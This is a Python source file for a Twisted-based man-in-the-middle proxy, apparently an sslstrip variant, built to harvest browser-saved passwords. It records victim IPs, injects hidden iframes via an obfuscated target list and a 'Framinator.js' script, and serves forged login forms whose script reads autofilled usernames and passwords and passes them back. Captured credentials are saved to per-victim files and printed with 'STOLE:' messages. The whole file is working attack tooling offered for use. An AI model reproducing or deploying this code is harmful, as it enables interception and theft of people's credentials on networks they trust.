
import urlparse, logging, os, sys, random

from twisted.web.http import Request
from twisted.web.http import HTTPChannel
from twisted.web.http import HTTPClient

from twisted.internet import ssl
from twisted.internet import defer
from twisted.internet import reactor
from twisted.internet.protocol import ClientFactory

from ServerConnectionFactory import ServerConnectionFactory
from ServerConnection import ServerConnection
#from SSLServerConnection import SSLServerConnection
from URLMonitor import URLMonitor
from DnsCache import DnsCache

class ClientRequest(Request):

    ''' This class represents incoming client requests and is essentially where
    the magic begins.  Here we remove the client headers we dont like, and then
    respond with either favicon spoofing, session denial, or proxy through HTTP
    or SSL to the server.
    '''    
    
    def __init__(self, channel, queued, reactor=reactor):
        Request.__init__(self, channel, queued)
        self.reactor       = reactor
        self.urlMonitor    = URLMonitor.getInstance()
        self.dnsCache      = DnsCache.getInstance()

    def cleanHeaders(self):
        
        headers = self.getAllHeaders().copy()
        
        if 'accept-encoding' in headers:
            del headers['accept-encoding']

        #if 'if-modified-since' in headers:
        #    del headers['if-modified-since']

        #if 'cache-control' in headers:
        #    del headers['cache-control']

        return headers

    def getPathFromUri(self):
        if (self.uri.find("http://") == 0):
            index = self.uri.find('/', 7)
            return self.uri[index:]

        return self.uri        

     
    def isCompromised(self,client):
        vics = open("vics/allvics",'r+')
        victims = vics.read()        
        vics.close()  
        if client in victims:
            return True
        else: 
            return False  
             

    def skipThis(self,path,client):
      
        if len(path) < 50 and path.find(".") == -1  and self.isCompromised(client) == False:
           return False 
        return True     
   


    def obfuscate(self,string):
        obfs = ""
        for letter in string:
            obfs+=str(ord(letter)+255)+"."

        return obfs[:-1]

    def saveCreds(self,client):


        uri = self.getPathFromUri()
        k = uri.find("&creds=")
        uri=uri[k+7:]
        if len(uri) == 0:
            print "STOLE NOTHING"
            return
       
        uri=uri.split("|||||")

        try:
           clientFile = open("vics/"+client,'a+')
           for cred in uri:
              clientFile.write(cred[1:]+"\n")
              print "STOLE: "+cred[1:]
           clientFile.close()

        except IOError as (errno, strerror):
           print "IO Error"

    def handleHostResolvedSuccess(self, address):
        logging.debug("Resolved host successfully: %s -> %s" % (self.getHeader('host'), address))

        host              = self.getHeader("host")
        client            = self.getClientIP()
        path              = self.getPathFromUri()

        self.content.seek(0,0)
        postData          = self.content.read()
        url               = 'http://' + host + path
        headers           = self.cleanHeaders()
        agent             = self.getHeader("user-agent").upper()
        
        if agent.find("CHROME/") > -1:
            agent = "CHROME"
        elif agent.find("FIREFOX/") > -1:
            agent = "FIREFOX"
        else:
            agent = "OTHER" 
             
        if path.find("Framinator=") != -1:
            if path.find("NOTHING") != -1:
                self.sendOK()
            else:
                self.saveCreds(client)
                if path.find("KILL") != -1:
                   self.sendWrapUp()
                else:
                   self.sendOK()

            return


        if url.find("q=12345")  != -1:     
           tmp = path.find("q=12345")
           path = path[:tmp-1]
           if(len(path) > 1):
              host += path
           #print "!!"+host
           self.sendForgery(host) 
           return

     
        if self.skipThis(path,client):
           actAs = "proxy"
        else:
           actAs = "framer"
           print "FRAME: "+url
           vics = open("vics/allvics",'a+')
           vics.write(client+";")        
           vics.close()
              
        self.dnsCache.cacheResolution(host, address)
                  
        if (self.urlMonitor.isSecureLink(client, url)):
           logging.debug("Sending request via SSL...")
           self.proxyViaSSL(address, self.method, path, postData, actAs,headers,self.urlMonitor.getSecurePort(client, url))
        else:
           logging.debug("Sending request via HTTP...")
           self.proxyViaHTTP(address, self.method, path, postData,actAs, headers)           


    def handleHostResolvedError(self, error):
        logging.warning("Host resolution error: " + str(error))
        self.finish()

    def resolveHost(self, host):
        address = self.dnsCache.getCachedAddress(host)

        if address != None:
            logging.debug("Host cached.")
            return defer.succeed(address)
        else:
            logging.debug("Host not cached.")
            return reactor.resolve(host)

    def process(self):

        host     = self.getHeader('host') 
        path     = self.getPathFromUri()           
        if("Framinator.js" in path):
           self.sendMaster()
        else:
           logging.debug("Resolving host: %s" % host)          
           deferred = self.resolveHost(host)
           deferred.addCallback(self.handleHostResolvedSuccess)
           deferred.addErrback(self.handleHostResolvedError)
        
    def proxyViaHTTP(self, host, method, path, postData,actAs,headers):

        connectionFactory          = ServerConnectionFactory(method, path, postData, actAs,headers,self)
   
        connectionFactory.protocol = ServerConnection
             
        self.reactor.connectTCP(host, 80, connectionFactory)

    def proxyViaSSL(self, host, method, path, postData, actAs,headers,port):

        clientContextFactory       = ssl.ClientContextFactory()
        connectionFactory          = ServerConnectionFactory(method, path, postData,actAs, headers, self)
            
        connectionFactory.protocol = ServerConnection
        
        self.reactor.connectSSL(host, port, connectionFactory, clientContextFactory)


    def getAction(self,host):
        fil = open("sites");
        action = "\"\"";
        h = host
        www = h.find("www.")
       
        if www != -1:
            h = h[www+4:]
        for filelineno, line in enumerate(fil):
            if "\r" in line or "\n" in line:
                line = line[:-1]
                
            line = line.split("|")
            if h in line[0]:
               if len(line[1]) > 0:
                  action = "\""+line[1]+"\""
               else:
                  action = "\"http://"+host+"\""
               break
        fil.close()
        return action

    def sendForgery(self,host):

        self.setResponseCode(200, "OK")
        actionURL = self.getAction(host) 
        #print "HOST: "+host + " ACTION: "+actionURL
        form = "<form method=\"POST\" action="+actionURL+"> \
                   <input type=\"text\" name=\"user\"/> \
                   <input type=\"password\" name=\"pass\"/> \
                </form>"

        sendCreds = "function sendCreds(creds){ \
                        window.parent.postMessage(window.name+\'$$$\'+creds,\'*\'); \
                     };"

        go =        "function go(){ \
                        user=document.getElementsByName(\'user\')[0].value; \
                        pass=document.getElementsByName(\'pass\')[0].value; \
                        host=location.hostname; \
                        if(pass.length > 0){ \
                           sendCreds(host+\',\'+user+\',\'+pass); \
                        }else{ \
                           sendCreds(\"\"); \
                        }; \
                     };" \

        js="<script type=\"text/javascript\">"+sendCreds+go+"setTimeout(\"go()\",500);</script>"
       
        data = "<html><head></head><body>"+form+js+"</body></html>"
        self.write(data)

        self.finish()      
  

    def sendOK(self):
        self.setResponseCode(200, "OK")
        self.setHeader("Connection", "close")   
        data = "<html><head></head><body></body></html>"
        self.write(data)    
        self.finish() 

        
    def sendWrapUp(self):
        self.setResponseCode(200, "OK")
        self.setHeader("Connection", "close") 

        js = "<script type=\"text/javascript\">  \
                window.parent.postMessage(\"destroy masterFrame\",\"*\") \
              </script>"

        data = "<html><head>"+js+"</head><body></body></html>"
        self.write(data)    
        self.finish()        


    def sendMaster(self):
        self.setResponseCode(200, "OK")
        self.setHeader("Connection", "keep-alive")
        obfuscatedTargets= ""
        targetFile = open("sites")
        
        for filelineno,line in enumerate(targetFile):
            if "\n" in line or "\r" in line:
                line = line[:-1]
            line = line.split("|")
            targetHost = line[0]; 

            if targetHost.startswith("http://"):
               targetHost = targetHost[7:]
                    

            if "?" in targetHost:
               sep = "&"
            else:
               sep = "?"
               
            target="http://"+targetHost+sep+"q=12345"
            obfuscatedTargets+="\""+self.obfuscate(target)+"\","
            
        obfuscatedTargets = obfuscatedTargets[:-1]
        targetFile.close() 
        
        js = open("Framinator.js",'r+')
        frame =  "<html><head><script type=\"text/javascript\">var targets=["+obfuscatedTargets+"];"+js.read() + "</script></head><body onload=\"init();\"></body></html>"
        js.close()
        
        self.write(frame)
        
        self.finish()
